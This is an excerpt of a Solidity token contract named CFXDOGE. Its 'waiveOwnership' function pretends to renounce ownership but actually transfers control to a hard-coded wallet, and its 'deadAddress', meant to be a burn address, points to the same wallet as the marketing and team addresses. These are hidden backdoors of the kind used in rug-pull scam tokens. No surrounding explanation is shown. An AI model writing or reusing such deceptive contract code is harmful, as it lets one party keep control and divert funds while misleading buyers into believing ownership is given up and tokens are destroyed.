...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x6685C4f9Bccf9F78F9ff59a2F59F80B6F5f85201));
        _owner = address(0x6685C4f9Bccf9F78F9ff59a2F59F80B6F5f85201);
    }
...
contract CFXDOGE  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CFXDOGE ";
    string private _symbol = "CFXDOGE ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x31Fd09f2E62723FCfBBe201257cd17cA83cDddA8);
    address payable public teamWalletAddress = payable(0x31Fd09f2E62723FCfBBe201257cd17cA83cDddA8);
    address public immutable deadAddress = 0x31Fd09f2E62723FCfBBe201257cd17cA83cDddA8;
